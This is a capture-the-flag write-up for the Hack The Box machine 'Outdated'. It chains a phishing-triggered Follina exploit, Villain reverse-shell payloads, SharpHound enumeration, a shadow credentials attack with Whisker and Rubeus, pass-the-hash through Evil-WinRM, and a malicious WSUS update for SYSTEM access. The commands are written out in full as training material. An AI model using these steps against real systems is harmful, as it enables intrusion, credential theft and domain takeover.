---
title: "HTB • Outdated"
tags:
  - "Medium Difficulty"
  - "Intermediate"
  - "Windows"
  - "Active Directory"
  - "SMB"
  - "Malicious Document"
  - "Shadow Credentials"
  - "WSUS"
  - "WinRM"
excerpt: "Outdated is a medium Windows machine on Hack the Box that involves malicious documents, shadow credentials, and WSUS exploitation. The vulnerable or misconfigured products featured in this machine include Microsoft Active Directory and Microsoft Windows. The products used to detect and exploit the vulnerable or misconfigured products include BloodHound, Whisker, Rubeus, and SharpWSUS"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-outdated/"
---


Outdated is a medium Windows machine created by [**ctrlzero**](https://app.hackthebox.com/users/168546) on [**Hack The Box**](https://app.hackthebox.com/machines/Outdated) that features an Active Directory domain controller that is vulnerable to **CVE-2022-30190**. Successful exploitation of this gets us a shell as a user called **btables**. This user holds a special privilege over the user **sflowers** that allows us to conduct a **shadow credentials attack** and authenticate as them. The user sflowers is part of a group that can create and approve **WSUS updates** which we can abuse to execute commands and get a privileged shell.

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="" # replace with machine address
echo rhost=$rhost >> .env && . ./.env
ctfscan $rhost
```
{:.nolineno}

Some services mentioned in the scan results are **25/SMTP**, **53/DNS**, **389/LDAP**, **445/SMB**, and **5985/WinRM**. The presence of some of these services indicate that this machine is probably an Active Directory domain controller.

## Server Message Block (SMB)

The first port that we'll enumerate is going to be SMB just because many SMB servers allow anonymous access.

### Anonymous Access

```bash
smbclient -N -L "//$rhost/"
```
{:.nolineno}

Using anonymous authentication, we are able to get a list of shares including one non-default share named simply _Shares_. Let's try to connect to this share and possibly download the contents.

```bash
smbclient -N "//$rhost/Shares"
```
{:.nolineno}

It turns out we can actually connect to this share without credentials! There is only one readable file called `NOC_Reminder.pdf`{:.filepath}.

#### Interesting Document

Let's download `NOC_Reminder.pdf`{:.filepath} using the `smbclient` command and see if we can obtain any interesting or valuable information from it.

```bash
smbclient -N "//$rhost/Shares" -c 'prompt;mget *;exit'
chromium ./NOC_Reminder.pdf
```
{:.nolineno}

![Interesting document](document.png)
_We find this interested document in an accessible SMB share_

We can gather a couple things from this document:
*   We can apparently email **itsupport@outdated.htb** with links to web applications which may be visited.
*   The target has several unpatched vulnerabilities from the time the document was created.

After doing some research into each CVE mentioned in the document, we find out that one of the vulnerabilities is well documented and has public exploits. This exploit is labeled as **CVE-2022-30190**, but is more commonly referred to as _Follina_.

## Follina

_Follina_ is a remote code execution vulnerability that can be exploited when a user or application opens a malicious link using the MSDT protocol. Since the document we downloaded earlier suggested that this flaw was not patched, it would be worth our time to investigate.

### Exploitation Conditions

In order to successfully exploit this machine, a few conditions must be met.

1.  The URL we submit via email must be visited
1.  The machine must be vulnerable to CVE-2022-30190

### Checking Exploitability

We can verify that the url is opened by setting up a web server and sending the URL to _itsupport@outdated.htb_. To do this, we can use a CLI tool called [swaks](https://github.com/jetmore/swaks).

```bash
# bryan@attacker
php -S "$lhost:80"
```
{:.nolineno}
```bash
# bryan@attacker
for i in {1..3}
    do swaks \
      --server "$rhost" \
      --to "itsupport@outdated.htb" \
      --from "email@mail.com" \
      --body "http://$lhost/"
    done
```
{: .nolineno}

After we send a few emails and wait a couple minutes, we get a request to our web server from the target.
>
```
[Sat Nov  5 04:13:23 2022] 10.10.11.175:49885 Accepted
[Sat Nov  5 04:13:23 2022] 10.10.11.175:49885 [404]: GET / - No such file or directory
[Sat Nov  5 04:13:23 2022] 10.10.11.175:49885 Closing
```

> If you are not receiving any requests after a few minutes, go ahead and reset the machine because this feature can be inconsistent at times.
{: .prompt-warning}

### Exploitation

At this point, we can try to exploit CVE-2022-30190 using a custom exploit script from [here](https://gist.github.com/bryanmcnulty/a02d96eb10b3beb4ea35115993b1981a) along with [Villain](https://github.com/t3l3machus/Villain).

First we start the villain server and generate our payload.

```bash
# bryan@attacker
villain -x 8844
```
{:.nolineno}
>
```bash
# bryan@attacker (Villain)
generate os=windows lhost=tun0
```
{:.nolineno}

Then we run the exploit server script with the generated payload.

```bash
./msdt_follina_exploit.py -l "$lhost" -p 80 -c "$payload"
```
{:.nolineno}

After waiting a minute or so, we get multiple requests from the target and a backdoor session for the user `btables` is established. We add an alias to this session to make things a bit quicker.

```bash
# Villain
alias outdated-btables 59fbcd84-ed554de3-c5698c38
```
{:.nolineno}

## Active Directory Enumeration

To better understand our current context in the domain and find any paths to privilege escalation, we will be using [BloodHound](https://github.com/BloodHoundAD/BloodHound) alongside [SharpHound](https://github.com/BloodHoundAD/SharpHound). These tools together will help enumerate and visualize the domain schema.

### BloodHound

First we will copy SharpHound's PowerShell wrapper from [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) onto the machine using the `smbserver.py` script from [Impacket](https://github.com/SecureAuthCorp/impacket).


```bash
mkdir share
smbserver.py -smb2support x ./share
```

Then in a different tab, download `Invoke-SharpHound4.ps1` to the SMB share directory.

```bash
cd share
wget "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1"
```

First we spawn an interactive shell and connect to our share.

```bash
# Villain
shell outdated-btables
```
```
net use x: \\10.10.14.3\x
```

Then we move to `C:\Windows\Tasks` and download `Invoke-SharpHound4.ps1` from our SMB server.

```
cd C:\Windows\Tasks
copy X:\Invoke-SharpHound4.ps1 .
```

Then we load `Invoke-SharpHound4.ps1`, and execute the `Invoke-SharpHound4` function

```powershell
powershell -Ep Bypass ". .\Invoke-SharpHound4.ps1;Invoke-SharpHound4"
```

After the command has completed, we should have a ZIP archive in our working directory. Let's copy it to the SMB server's directory and load it into BloodHound.

```
copy .\*_BloodHound.zip X:\
```

Once we load the data into bloodhound, we can map a possible attack path with the `Reachable High Value Targets` query on the `btables` object.

![Bloodhound](bloodhound.png)

Notice how one of the groups our current user is a member of, the `ITSTAFF` group, has the `AddKeyCredentialLink` privilege over the `sflowers` user object. This could set us up for a _shadow credentials_ attack on this user.


## Shadow Credentials

To learn more about shadow credentials from a security perspective I would recommend reading [this article](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).

### Whisker

A tool called [Whisker](https://github.com/eladshamir/Whisker) will help us abuse shadow credentials to compromise the **sflowers** object. Let's download [this](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Whisker.ps1) PowerShell wrapper for Whisker onto the target then execute the following commands.

```powershell
. .\Invoke-Whisker.ps1
Invoke-Whisker "add /target:sflowers /path:C:\Windows\Tasks\cert.bin /password:3d9563b2cc0c963e"
```

This should print a command meant for a tool called [Rubeus](https://github.com/GhostPack/Rubeus).

### Rubeus

Let's copy the Rubeus powershell wrapper to the target from [here](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1) then call the function with the arguments specified in the Whisker output.

```powershell
. .\Invoke-Rubeus.ps1
Invoke-Rubeus "asktgt /user:sflowers /certificate:C:\Windows\Tasks\cert.bin /password:3d9563b2cc0c963e /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show"
```
{:.nolineno}

With this command we are able to recover an NTLM hash that should allow us to authenticate as `sflowers`.

## WSUS Abuse

Looking back at our BloodHound window, it appears that _sflowers_ is a member of the `Remote Management Users` group and the `WSUS Administrators` group.

![SFlowers membership](bloodhound2.png)

Having membership in the `Remote Management Users` group means we can easily establish a shell as `sflowers` with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) using the hash we obtained with Rubeus. Once we do that the user flag can be found at `%USERPROFILE%\Desktop\user.txt`

```bash
# Back to the attacking machine
evil-winrm -i "$rhost" -u "sflowers" -H "$hash"
```
```powershell
# Evil-WinRM
$Desktop = "$env:UserProfile\Desktop"
Get-ChildItem "$Desktop"
Get-Content "$Desktop\user.txt"
```

I'm assuming our membership to the WSUS Administrators group will let us install WSUS updates on the machine. The [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) utility along with a tool called [SharpWSUS](https://github.com/nettitude/SharpWSUS/) can aid us in exploiting WSUS and gaining administrative privileges. We were actually able to find the suspected PsExec executable already at `C:\Users\sflowers\Desktop\PsExec64.exe`{:.filepath}. We confirm that this is the legitimate executable by comparing its checksum with the checksum of Microsoft's `PsExec64.exe` within the [PsTools](https://download.sysinternals.com/files/PSTools.zip) package.

Let's upload [this](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1) powershell wrapper for SharpWSUS, generate a Villain payload, and run the `Invoke-SharpWSUS` function with the appropriate arguments to create a new update.

First let's create a new Villain payload to execute within our malicious WSUS update.

```bash
# Villain
generate os=windows lhost=tun0 encode
```

Then we create a new update that will use the `PsExec64.exe` utility to execute our payload.

```powershell
$VillainPayload = "" # Add villain payload here
Invoke-SharpWSUS create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d $VillainPayload"
```

The output should display an update ID that we can use with the `approve` option to approve the update for `dc.outdated.htb`.

```powershell
$UpdateId = "" # Add update id here
Invoke-SharpWSUS approve /updateid:"$UpdateId" /computername:"dc.outdated.htb" /groupname:"3v1LGr0Up"
```

Then after a few minutes we should have a new backdoor session on our Villain server. We then connect to the session using the `shell` command and read the flag at `C:\Users\Administrator\Desktop\root.txt`{:.filepath}.
